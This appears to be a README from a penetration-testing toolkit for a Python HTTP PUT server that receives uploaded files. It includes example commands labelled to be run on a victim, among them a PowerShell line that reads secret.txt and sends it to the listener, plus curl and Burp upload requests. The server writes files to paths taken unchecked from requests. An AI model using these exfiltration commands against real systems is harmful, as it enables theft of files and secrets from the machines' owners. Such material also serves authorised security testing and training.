Start the server
------------------------
```bash
python simple-python-put-server.py <ip-address> <port>
```
Example usages (run on victim)
------------------------
```
curl
---
curl -X PUT --upload-file test.txt http://<ip-address>:<port>

Burp
PUT /hello.txt HTTP/1.1
Host: <ip-address>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 19
Upgrade-Insecure-Requests: 1

sdokajsldfkhfsdfdf

powershell
$body = Get-Content secret.txt
Invoke-RestMethod -Uri http://ip:port/secret.txt -Method PUT -Body $body
```
Script
------------------------
```python
import sys
import signal
from threading import Thread
from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
 
 
 
class PUTHandler(BaseHTTPRequestHandler):
    def do_PUT(self):
        length = int(self.headers['Content-Length'])
        content = self.rfile.read(length)
        self.send_response(200)
        with open(self.path[1:], "w") as f:
            f.write(content)
 
 
def run_on(port):
    print("Starting a HTTP PUT Server on {0} port {1} (http://{0}:{1}) ...".format(sys.argv[1], port))
    server_address = (sys.argv[1], port)
    httpd = HTTPServer(server_address, PUTHandler)
    httpd.serve_forever()
 
 
if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage:\n\tpython {0} ip 1337".format(sys.argv[0]))
        sys.exit(1)
    ports = [int(arg) for arg in sys.argv[2:]]
    try:
        for port_number in ports:
            server = Thread(target=run_on, args=[port_number])
            server.daemon = True # Do not make us wait for you to exit
        server.start()
        signal.pause() # Wait for interrupt signal, e.g. KeyboardInterrupt
    except KeyboardInterrupt:
        print "\nPython HTTP PUT Server Stoped."
        sys.exit(1)
```
